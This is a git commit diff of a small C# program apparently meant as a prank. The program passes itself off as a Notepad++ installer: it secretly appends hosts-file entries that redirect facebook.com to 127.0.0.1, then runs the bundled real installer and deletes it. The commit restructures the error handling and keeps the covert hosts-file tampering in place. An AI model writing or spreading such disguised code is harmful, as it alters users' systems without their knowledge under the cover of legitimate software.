93ff4e7b6069e8ec336edaacc2898f2560b01d2e
dexmo007 <henrik.drefs@outlook.de>
2016-03-10 12:47:59 +0100

    again bcs i am stupid

--- Program.cs
+++ Program.cs
@@ -18,33 +18,41 @@ namespace hack
         /// </summary>
         private static void Main()
         {
-            using (var sw = new StreamWriter(new FileStream(HostsPath, FileMode.Append)))
-            {
-                sw.WriteLine();
-                sw.WriteLine("127.0.0.1 www.facebook.com");
-                sw.WriteLine("127.0.0.1 facebook.com");
-            }
-            var exeBytes = Resources.npp_6_9_Installer;
-            var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "npp.6.9.Installer.exe");
-            using (var fs = new FileStream(tempFile, FileMode.OpenOrCreate))
-            {
-                fs.Write(exeBytes, 0, exeBytes.Length);
-            }
             try
             {
-                using (var nppProcess = Process.Start(tempFile))
+                using (var sw = new StreamWriter(new FileStream(HostsPath, FileMode.Append)))
                 {
-                    nppProcess?.WaitForExit();
+                    sw.WriteLine();
+                    sw.WriteLine("127.0.0.1 www.facebook.com");
+                    sw.WriteLine("127.0.0.1 facebook.com");
+                }
+                var exeBytes = Resources.npp_6_9_Installer;
+                var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "npp.6.9.Installer.exe");
+                using (var fs = new FileStream(tempFile, FileMode.OpenOrCreate))
+                {
+                    fs.Write(exeBytes, 0, exeBytes.Length);
+                }
+                try
+                {
+                    using (var nppProcess = Process.Start(tempFile))
+                    {
+                        nppProcess?.WaitForExit();
+                    }
+                }
+                catch (Exception e)
+                {
+                    MessageBox.Show(e.GetType() + Environment.NewLine + e.Message, "Severe internal hack error",
+                        MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+                finally
+                {
+                    File.Delete(tempFile);
                 }
             }
             catch (Exception e)
             {
                 MessageBox.Show(e.GetType() + Environment.NewLine + e.Message, "Severe internal hack error",
-                    MessageBoxButtons.OK, MessageBoxIcon.Error);
-            }
-            finally
-            {
-                File.Delete(tempFile);
+                        MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
 
         }
